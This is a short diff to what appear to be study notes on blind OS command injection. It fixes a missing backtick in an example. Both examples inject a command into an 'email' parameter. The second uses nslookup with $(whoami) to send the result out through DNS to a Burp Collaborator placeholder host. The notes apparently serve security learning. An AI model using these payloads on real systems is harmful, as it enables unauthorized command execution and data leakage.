@@ -24,4 +24,4 @@
 - ex1:
 > **`email` parameter**: `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
 - ex2:
-> **`email` parameter**: `email=||nslookup+$(whoami).BURP-COLLABORATOR-SUBDOMAIN||
+> **`email` parameter**: `email=||nslookup+$(whoami).BURP-COLLABORATOR-SUBDOMAIN||`
